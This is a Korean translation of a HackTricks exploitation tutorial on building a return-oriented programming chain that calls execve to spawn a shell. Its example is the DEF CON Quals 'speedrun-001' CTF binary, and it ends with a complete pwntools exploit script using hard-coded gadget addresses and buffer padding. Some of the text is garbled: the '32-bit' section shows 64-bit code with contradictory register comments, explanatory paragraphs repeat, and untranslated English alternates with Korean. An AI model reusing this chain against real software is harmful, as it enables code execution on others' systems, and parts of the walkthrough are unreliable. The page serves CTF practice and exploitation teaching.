# ROP - sys\_execve 호출

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>을 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**를** **팔로우**하세요.
* **HackTricks**와 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 저장소에 PR을 제출하여 자신의 해킹 기법을 공유하세요.

</details>

**syscall**을 호출하기 위해 다음 구성이 필요합니다:

* `rax: 59 sys_execve 지정`
* `rdi: "/bin/sh" 파일을 실행할 위치를 지정`
* `rsi: 0 인수가 전달되지 않음을 지정`
* `rdx: 0 환경 변수가 전달되지 않음을 지정`

따라서, 기본적으로 문자열 `/bin/sh`를 어딘가에 작성한 다음 `syscall`을 수행해야 합니다(스택을 제어하기 위해 필요한 패딩을 고려해야 함).

## 레지스터 제어

**레지스터를 제어하는 방법**을 찾아봅시다:
```c
ROPgadget --binary speedrun-001 | grep -E "pop (rdi|rsi|rdx\rax) ; ret"
0x0000000000415664 : pop rax ; ret
0x0000000000400686 : pop rdi ; ret
0x00000000004101f3 : pop rsi ; ret
0x00000000004498b5 : pop rdx ; ret
```
이 주소들을 사용하여 **스택에 내용을 작성하고 레지스터에로드**할 수 있습니다.

## 문자열 작성

### 쓰기 가능한 메모리

먼저 메모리에서 쓰기 가능한 장소를 찾아야합니다.
```bash
gef> vmmap
[ Legend:  Code | Heap | Stack ]
Start              End                Offset             Perm Path
0x0000000000400000 0x00000000004b6000 0x0000000000000000 r-x /home/kali/git/nightmare/modules/07-bof_static/dcquals19_speedrun1/speedrun-001
0x00000000006b6000 0x00000000006bc000 0x00000000000b6000 rw- /home/kali/git/nightmare/modules/07-bof_static/dcquals19_speedrun1/speedrun-001
0x00000000006bc000 0x00000000006e0000 0x0000000000000000 rw- [heap]
```
### 문자열 작성

그런 다음 이 주소에 임의의 내용을 작성하는 방법을 찾아야 합니다.
```python
ROPgadget --binary speedrun-001 | grep " : mov qword ptr \["
mov qword ptr [rax], rdx ; ret #Write in the rax address the content of rdx
```
#### 32 비트

##### ROP (Return Oriented Programming)

ROP (Return Oriented Programming)은 공격자가 실행 흐름을 조작하기 위해 프로그램의 기존 코드 조각들을 재활용하는 기법입니다. 이 기법은 실행 가능한 코드 조각들을 찾아서 스택에 적절한 순서로 배치하고, 이후에는 이 코드 조각들을 실행하여 원하는 동작을 수행합니다.

##### 시스템 호출 (syscall)

시스템 호출은 운영 체제의 기능을 사용하기 위해 프로그램이 운영 체제에 요청하는 메커니즘입니다. 시스템 호출은 프로그램이 운영 체제의 기능을 사용할 수 있도록 하는 인터페이스 역할을 합니다. 시스템 호출은 보통 레지스터에 특정 값을 설정하고, 소프트웨어 인터럽트를 발생시켜 운영 체제에 요청을 전달합니다.

##### execv 시스템 호출

execv 시스템 호출은 새로운 프로그램을 실행하기 위해 사용됩니다. 이 시스템 호출은 실행할 프로그램의 경로와 인수를 인자로 받아서 해당 프로그램을 실행합니다. execv 시스템 호출은 새로운 프로그램의 실행 흐름을 현재 프로세스에서 새로운 프로세스로 전환시킵니다.

##### ROP를 사용한 execv 시스템 호출

ROP를 사용하여 execv 시스템 호출을 수행하는 방법은 다음과 같습니다.

1. 필요한 인자들을 스택에 적절한 순서로 배치합니다.
2. execv 시스템 호출의 번호를 eax 레지스터에 설정합니다.
3. 소프트웨어 인터럽트를 발생시켜 execv 시스템 호출을 실행합니다.

이렇게 하면 ROP를 사용하여 execv 시스템 호출을 수행할 수 있습니다.
```python
'''
Lets write "/bin/sh" to 0x6b6000

pop rdx, 0x2f62696e2f736800
pop rax, 0x6b6000
mov qword ptr [rax], rdx
'''

rop += popRdx           # place value into EAX
rop += "/bin"           # 4 bytes at a time
rop += popRax           # place value into edx
rop += p32(0x6b6000)    # Writable memory
rop += writeGadget   #Address to: mov qword ptr [rax], rdx

rop += popRdx
rop += "//sh"
rop += popRax
rop += p32(0x6b6000 + 4)
rop += writeGadget
```
#### 64 비트

##### ROP (Return Oriented Programming)

ROP (Return Oriented Programming)은 공격자가 실행 흐름을 조작하기 위해 프로그램의 기존 코드 조각들을 재활용하는 기법입니다. 이 기법은 실행 가능한 코드 조각들을 찾아서 스택에 적절한 순서로 배치하여 공격자가 원하는 명령을 실행하도록 합니다.

##### 시스템 호출 (Syscall)

시스템 호출은 운영 체제의 기능을 사용하기 위해 프로그램이 운영 체제에 요청하는 메커니즘입니다. 시스템 호출은 프로그램이 운영 체제의 기능을 사용하여 파일을 열거나 읽고 쓰는 등의 작업을 수행할 수 있게 해줍니다.

##### execv 시스템 호출

execv 시스템 호출은 새로운 프로그램을 실행하는 데 사용됩니다. 이 시스템 호출은 새로운 프로그램의 경로와 인수를 전달하여 실행합니다. 이를 통해 공격자는 시스템에서 임의의 명령을 실행할 수 있습니다.

##### ROP를 사용한 execv 시스템 호출

ROP를 사용하여 execv 시스템 호출을 수행하는 방법은 다음과 같습니다.

1. 필요한 시스템 호출 번호를 찾습니다.
2. 필요한 인수를 스택에 적절한 순서로 배치합니다.
3. ROP 체인을 생성하여 execv 시스템 호출을 수행합니다.

이를 통해 공격자는 임의의 프로그램을 실행하거나 시스템에서 원하는 명령을 실행할 수 있습니다.
```python
'''
Lets write "/bin/sh" to 0x6b6000

pop rdx, 0x2f62696e2f736800
pop rax, 0x6b6000
mov qword ptr [rax], rdx
'''
rop = ''
rop += popRdx
rop += "/bin/sh\x00" # The string "/bin/sh" in hex with a null byte at the end
rop += popRax
rop += p64(0x6b6000) # Writable memory
rop += writeGadget #Address to: mov qword ptr [rax], rdx
```
## 예제

Let's consider a simple example to understand how to use ROP to execute a `execve` syscall in Linux.

우리는 리눅스에서 `execve` 시스콜을 실행하기 위해 ROP를 사용하는 방법을 이해하기 위해 간단한 예제를 살펴보겠습니다.

Assume we have a vulnerable program with a buffer overflow vulnerability. The vulnerable program takes user input and copies it into a buffer without proper bounds checking.

취약한 프로그램이 있는 것으로 가정해봅시다. 이 취약한 프로그램은 사용자 입력을 받아 적절한 경계 검사 없이 버퍼에 복사합니다.

Our goal is to exploit this vulnerability and execute the `execve` syscall to spawn a shell.

우리의 목표는 이 취약점을 이용하여 `execve` 시스콜을 실행하여 쉘을 생성하는 것입니다.

To achieve this, we need to construct a ROP chain that will set up the necessary registers for the `execve` syscall and then trigger the syscall.

이를 위해, `execve` 시스콜을 위해 필요한 레지스터를 설정하고 시스콜을 트리거할 수 있는 ROP 체인을 구성해야 합니다.

First, we need to find the addresses of the gadgets we will use in our ROP chain. We can use tools like `ROPgadget` or `ropper` to search for gadgets in the binary.

먼저, ROP 체인에서 사용할 가젯들의 주소를 찾아야 합니다. `ROPgadget`이나 `ropper`와 같은 도구를 사용하여 이진 파일에서 가젯을 검색할 수 있습니다.

Once we have the addresses of the gadgets, we can start constructing our ROP chain. The ROP chain will consist of a series of gadgets that will manipulate the stack and set up the necessary registers.

가젯의 주소를 얻으면 ROP 체인을 구성할 수 있습니다. ROP 체인은 스택을 조작하고 필요한 레지스터를 설정하는 일련의 가젯으로 구성됩니다.

Here is an example ROP chain that sets up the necessary registers for the `execve` syscall:

다음은 `execve` 시스콜을 위해 필요한 레지스터를 설정하는 예제 ROP 체인입니다:

```assembly
pop rdi; ret
/bin/sh\x00
pop rsi; ret
NULL
pop rdx; ret
NULL
pop rax; ret
0x3b
syscall
```

In this example, we are using the `pop` gadgets to set the values of the registers `rdi`, `rsi`, `rdx`, and `rax`. We set `rdi` to the address of the string "/bin/sh\x00", `rsi` and `rdx` to NULL, and `rax` to 0x3b (the syscall number for `execve`).

이 예제에서는 `pop` 가젯을 사용하여 `rdi`, `rsi`, `rdx`, `rax` 레지스터의 값을 설정합니다. `rdi`를 문자열 "/bin/sh\x00"의 주소로 설정하고, `rsi`와 `rdx`를 NULL로 설정하며, `rax`를 `execve`의 시스콜 번호인 0x3b로 설정합니다.

After setting up the registers, we trigger the syscall instruction to execute the `execve` syscall.

레지스터를 설정한 후, 시스콜 명령을 트리거하여 `execve` 시스콜을 실행합니다.

By constructing and executing this ROP chain, we can exploit the buffer overflow vulnerability and spawn a shell.

이 ROP 체인을 구성하고 실행함으로써 버퍼 오버플로 취약점을 이용하고 쉘을 생성할 수 있습니다.
```python
from pwn import *

target = process('./speedrun-001')
#gdb.attach(target, gdbscript = 'b *0x400bad')

# Establish our ROP Gadgets
popRax = p64(0x415664)
popRdi = p64(0x400686)
popRsi = p64(0x4101f3)
popRdx = p64(0x4498b5)

# 0x000000000048d251 : mov qword ptr [rax], rdx ; ret
writeGadget = p64(0x48d251)

# Our syscall gadget
syscall = p64(0x40129c)

'''
Here is the assembly equivalent for these blocks
write "/bin/sh" to 0x6b6000

pop rdx, 0x2f62696e2f736800
pop rax, 0x6b6000
mov qword ptr [rax], rdx
'''
rop = ''
rop += popRdx
rop += "/bin/sh\x00" # The string "/bin/sh" in hex with a null byte at the end
rop += popRax
rop += p64(0x6b6000)
rop += writeGadget

'''
Prep the four registers with their arguments, and make the syscall

pop rax, 0x3b
pop rdi, 0x6b6000
pop rsi, 0x0
pop rdx, 0x0

syscall
'''

rop += popRax
rop += p64(0x3b)

rop += popRdi
rop += p64(0x6b6000)

rop += popRsi
rop += p64(0)
rop += popRdx
rop += p64(0)

rop += syscall


# Add the padding to the saved return address
payload = "0"*0x408 + rop

# Send the payload, drop to an interactive shell to use our new shell
target.sendline(payload)

target.interactive()
```
## 참고 자료

* [https://guyinatuxedo.github.io/07-bof\_static/dcquals19\_speedrun1/index.html](https://guyinatuxedo.github.io/07-bof\_static/dcquals19\_speedrun1/index.html)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 상품**](https://peass.creator-spring.com)을 구매하세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFT**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)를 **팔로우**하세요.
* **HackTricks**와 **HackTricks Cloud** github 저장소에 PR을 제출하여 여러분의 해킹 기법을 공유하세요.

</details>
